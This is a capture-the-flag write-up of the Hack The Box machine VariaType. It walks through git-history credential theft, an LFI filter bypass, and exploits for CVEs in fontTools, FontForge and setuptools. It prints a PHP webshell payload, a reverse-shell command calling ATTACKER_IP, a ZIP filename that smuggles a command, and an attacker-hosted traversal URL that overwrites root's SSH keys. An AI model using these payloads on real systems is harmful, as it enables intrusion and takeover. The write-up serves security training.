# HTB VariaType — Full Writeup

**Platform:** Hack The Box  
**Difficulty:** Medium  
**OS:** Linux  
**Season:** Season 10  
**Status:** Retired  
**CVEs:** CVE-2025-66034 · CVE-2024-25081 · CVE-2025-47273  

---

## Overview

VariaType is a medium-difficulty Linux machine themed around a fictional font technology company. The attack chain crosses three real CVEs in the font tooling ecosystem — fontTools, FontForge, and Python setuptools — progressing from unauthenticated access through to root. The path moves from exposed Git history on an internal portal, through XML injection in variable font compilation, command injection via crafted archive filenames, and finally a path traversal vulnerability in Python's package management infrastructure.

**Full chain:**
```
Exposed .git → hardcoded creds → LFI → fontTools XML injection (www-data)
  → FontForge ZIP filename injection via cron (steve)
    → setuptools path traversal via sudo (root)
```

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -Pn -sS -sV -sC -oA ~/Documents/HTB/variatype/nmap_initial 10.129.7.228
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 9.2p1 Debian |
| 80 | HTTP | nginx 1.22.1 |

Port 80 redirects to `variatype.htb`. Add to `/etc/hosts`:

```bash
echo "10.129.7.228 variatype.htb portal.variatype.htb" | sudo tee -a /etc/hosts
```

Virtual host enumeration reveals two applications:

- `variatype.htb` — Public Flask app with a variable font generator
- `portal.variatype.htb` — Internal PHP validation dashboard behind a login form

---

## Step 1 — Git History Exposure

The portal exposes its `.git` directory at `http://portal.variatype.htb/.git/HEAD` (HTTP 200).

```bash
git-dumper http://portal.variatype.htb/.git/ portal-dump
cd portal-dump
git log --oneline
```

Output:
```
753b5f5 fix: add gitbot user for automated validation pipeline
5030e79 feat: initial portal implementation
```

Inspect the diff between commits:

```bash
git diff 5030e79 753b5f5
```

This reveals hardcoded credentials added to `auth.php`:

```php
$USERS = [
    'gitbot' => 'G1tB0t_Acc3ss_2025!'
];
```

**Credentials:** `gitbot` / `G1tB0t_Acc3ss_2025!`

Log into the portal dashboard at `http://portal.variatype.htb`.

---

## Step 2 — LFI via download.php

The portal has `view.php?f=` and `download.php?f=` endpoints. The path traversal sanitization in `download.php` uses a naive single-pass `str_replace`:

```php
$file = str_replace("../", "", $file);
```

This is bypassed with `....//` — after one replacement pass, `....//` collapses to `../`:

```bash
curl -s -b cookies.txt \
  "http://portal.variatype.htb/download.php?f=....//....//....//....//....//etc/passwd"
```

This confirms user `steve` (uid 1000) and allows reading system files to map the application architecture. Further LFI reads reveal the Flask app source at `/opt/variatype/app.py` and the portal PHP source.

---

## Step 3 — Foothold via fontTools XML Injection (CVE-2025-66034)

### Vulnerability

The font generator at `variatype.htb` accepts `.designspace` XML files and compiles variable fonts using fontTools:

```python
subprocess.run(['fonttools', 'varLib', 'config.designspace'], cwd=workdir)
```

CVE-2025-66034 affects fontTools 4.33.0–4.60.1. The `variable-font` element's `filename` attribute is passed to `os.path.join()` without sanitization. When the filename is an absolute path, `os.path.join()` ignores the base directory entirely. Additionally, `labelname` elements accept CDATA content embedded verbatim in the output font binary.

### Exploit

Craft the malicious `.designspace` file:

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php passthru($_REQUEST["x"]); ?>]]]]><![CDATA[>]]></labelname>
      <labelname xml:lang="fr">Regular</labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/shell.php">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```

Key elements:
- The absolute `filename` attribute writes the output directly into the portal's web-accessible directory
- The CDATA in `labelname` embeds PHP code in the output font binary
- PHP ignores surrounding binary data and executes only code between `<?php ?>` tags
- Two minimal TTF master fonts are uploaded alongside the designspace to satisfy fontTools

Verify the webshell:

```bash
curl "http://portal.variatype.htb/files/shell.php?x=id"
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Get a reverse shell:

```bash
# Listener on attacker
nc -lvnp 4444

# Trigger via webshell
curl "http://portal.variatype.htb/files/shell.php?x=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

Upgrade the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
```

---

## Step 4 — Lateral Movement via FontForge Command Injection (CVE-2024-25081)

### Enumeration as www-data

```bash
cat /opt/process_client_submissions.bak
cat /etc/crontab
```

A cron job runs as `steve` processing font uploads from the portal directory using FontForge:

```bash
timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "
  import fontforge
  font = fontforge.open('$file')
  ...
"
```

The script processes `*.zip` files. FontForge 20230101 is vulnerable to CVE-2024-25081 — when FontForge opens a ZIP archive, it processes internal filenames through shell execution. A filename containing `$(command)` triggers arbitrary command execution.

### Exploit

Generate an SSH key pair on the attacker machine:

```bash
ssh-keygen -t ed25519 -f /tmp/steve_key -N ""
cat /tmp/steve_key.pub
```

Craft the malicious ZIP with a command-injecting filename:

```python
import zipfile, base64

pub_key = "ssh-ed25519 AAAA... kali@kali"
cmd = f'mkdir -p /home/steve/.ssh && echo "{pub_key}" >> /home/steve/.ssh/authorized_keys && chmod 700 /home/steve/.ssh && chmod 600 /home/steve/.ssh/authorized_keys'
payload = base64.b64encode(cmd.encode()).decode()
member_name = f"$(echo {payload}|base64 -d|bash).ttf"

with zipfile.ZipFile("exploit.zip", "w") as zf:
    zf.writestr(member_name, b"\x00" * 64)
```

Upload `exploit.zip` to the portal via the webshell, then wait up to 2 minutes for the cron job to execute. SSH in once the key is written:

```bash
ssh -i /tmp/steve_key steve@variatype.htb
```

Grab the user flag:

```bash
cat ~/user.txt
```

---

## Step 5 — Privilege Escalation via setuptools Path Traversal (CVE-2025-47273)

### Enumeration as steve

```bash
sudo -l
```

Output:
```
(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

Read the script:

```bash
cat /opt/font-tools/install_validator.py
```

It uses `setuptools.package_index.PackageIndex` to download "validation plugins" from a URL:

```python
index = PackageIndex()
downloaded_path = index.download(plugin_url, PLUGIN_DIR)
```

### Vulnerability

CVE-2025-47273 is a path traversal in `PackageIndex._download_url()`. The filename is extracted from the URL via `egg_info_for_url()`, then joined with `os.path.join(tmpdir, name)`. When `name` starts with `/`, `os.path.join()` discards `tmpdir` entirely.

URL-encoded forward slashes (`%2F`) are decoded into literal `/` characters by `egg_info_for_url()`, producing an absolute path. A URL slash count check (`url.count('/') > 10`) uses literal `/` characters only, so `%2F` bypasses it.

```python
egg_info_for_url("http://attacker:8888/%2Froot%2F.ssh%2Fauthorized_keys")
# → name = "/root/.ssh/authorized_keys"

os.path.join("/opt/font-tools/validators", "/root/.ssh/authorized_keys")
# → "/root/.ssh/authorized_keys"  (tmpdir discarded)
```

### Exploit

**Step 1 — Prepare the authorized_keys payload on attacker machine:**

```bash
cat /tmp/steve_key.pub > authorized_keys
```

**Step 2 — Serve it via HTTP:**

```bash
python3 -m http.server 8888
```

**Step 3 — Trigger the path traversal as steve:**

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  "http://ATTACKER_IP:8888/%2Froot%2F.ssh%2Fauthorized_keys"
```

**Step 4 — SSH as root:**

```bash
ssh -i /tmp/steve_key root@variatype.htb
cat /root/root.txt
```

---

## Flags

| Flag | Location |
|------|----------|
| user.txt | `/home/steve/user.txt` |
| root.txt | `/root/root.txt` |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| git-dumper | Extracting exposed .git directories |
| curl | Web interaction, LFI exploitation, webshell usage |
| Python zipfile | Crafting malicious ZIP with injected filename |
| python3 -m http.server | Serving SSH key for setuptools exploit |
| ssh-keygen | Generating ed25519 key pair for persistent access |
| nc | Reverse shell listener |

---

## Key Takeaways

**Git history is full source disclosure** — Even when credentials are "removed" in a later commit, the full history is preserved. Exposed `.git` directories must be treated as complete code disclosure including all prior states.

**Single-pass string replacement is not sanitization** — The `str_replace("../", "")` bypass with `....//` is a textbook failure. Use `realpath()` or proper path canonicalization instead.

**`os.path.join()` silently discards base paths** — Both the fontTools and setuptools CVEs exploit the same Python stdlib behavior: `os.path.join("/base", "/absolute")` returns `"/absolute"`. Any user-controlled path component must be validated post-join to confirm it stays within the intended directory.

**URL encoding bypasses literal character checks** — `%2F` passes a `/` count check that operates on the raw URL string. Validation should always operate on the decoded, canonical form.

**Archive contents bypass filename checks** — The FontForge exploit works because the filename validation applies to the ZIP archive name, not its internal members. Each extracted filename must be independently validated.

**CVE chaining multiplies impact** — No single vulnerability here grants root. Each CVE provides one stepping stone: file write → code execution → lateral movement → privilege escalation. Defense in depth matters.
